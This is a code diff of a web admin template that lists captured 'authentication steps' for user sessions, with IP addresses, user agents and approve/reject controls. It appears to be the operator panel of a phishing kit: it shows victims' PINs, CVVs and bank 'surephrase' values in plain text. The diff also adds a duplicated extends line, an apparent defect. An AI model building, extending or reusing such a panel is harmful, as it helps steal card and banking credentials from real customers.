@@ -1,4 +1,5 @@
 {% extends "base.html" %}
+{% extends "base.html" %}
 
 {% block title %}View Session Data - Admin{% endblock %}
 
@@ -189,24 +190,24 @@
     </div>
     <div class="data-row">
       <div class="data-label">Started:</div>
-      <div class="data-value">{{ data.session_start.strftime('%Y-%m-%d %H:%M:%S') if data.session_start else 'Unknown' }}</div>
+      <div class="data-value">{{ user_session.session_start.strftime('%Y-%m-%d %H:%M:%S') }}</div>
     </div>
-    {% if data.approved_at %}
+    {% if user_session.approved_at %}
     <div class="data-row">
       <div class="data-label">Status:</div>
       <div class="data-value">
         <span class="status-badge status-approved">Approved</span>
-        at {{ data.approved_at.strftime('%Y-%m-%d %H:%M:%S') }}
-        by {{ data.approved_by or 'admin' }}
+        at {{ user_session.approved_at.strftime('%Y-%m-%d %H:%M:%S') }}
+        by {{ user_session.approved_by or 'admin' }}
       </div>
     </div>
-    {% elif data.rejected_at %}
+    {% elif user_session.rejected_at %}
     <div class="data-row">
       <div class="data-label">Status:</div>
       <div class="data-value">
         <span class="status-badge status-rejected">Rejected</span>
-        at {{ data.rejected_at.strftime('%Y-%m-%d %H:%M:%S') }}
-        by {{ data.rejected_by or 'admin' }}
+        at {{ user_session.rejected_at.strftime('%Y-%m-%d %H:%M:%S') }}
+        by {{ user_session.rejected_by or 'admin' }}
       </div>
     </div>
     {% else %}
@@ -217,37 +218,50 @@
       </div>
     </div>
     {% endif %}
+    {% if user_session.ip_address %}
+    <div class="data-row">
+      <div class="data-label">IP Address:</div>
+      <div class="data-value">{{ user_session.ip_address }}</div>
+    </div>
+    {% endif %}
+    {% if user_session.user_agent %}
+    <div class="data-row">
+      <div class="data-label">User Agent:</div>
+      <div class="data-value">{{ user_session.user_agent }}</div>
+    </div>
+    {% endif %}
   </div>
 
-  {% if data.steps %}
+  {% if user_session.steps %}
   <div class="steps-container">
     <div style="padding: 20px; background: #f8f9fa; border-bottom: 1px solid #dee2e6;">
       <h3 style="margin: 0;">Authentication Steps</h3>
     </div>
     
-    {% for step_name, step_data in data.steps.items() %}
+    {% for auth_step in user_session.steps %}
     <div class="step-item">
       <div class="step-header">
-        <div class="step-name">{{ step_name }}</div>
-        <div class="step-time">{{ step_data.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</div>
+        <div class="step-name">{{ auth_step.step_name }}</div>
+        <div class="step-time">{{ auth_step.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</div>
       </div>
       
       <div class="step-data">
-        {% for key, value in step_data.data.items() %}
-          {% if key != 'timestamp' %}
+        {% if auth_step.step_data %}
+          {% set step_json = auth_step.step_data | from_json %}
+          {% for key, value in step_json.items() %}
           <div class="data-row">
             <div class="data-label">{{ key|title|replace('_', ' ') }}:</div>
             <div class="data-value {% if key in ['pin', 'surephrase', 'cvv'] %}sensitive-data{% endif %}">
               {{ value }}
             </div>
           </div>
-          {% endif %}
-        {% endfor %}
+          {% endfor %}
+        {% endif %}
         
-        {% if step_data.ip_address %}
+        {% if auth_step.ip_address %}
         <div class="data-row">
           <div class="data-label">IP Address:</div>
-          <div class="data-value">{{ step_data.ip_address }}</div>
+          <div class="data-value">{{ auth_step.ip_address }}</div>
         </div>
         {% endif %}
       </div>
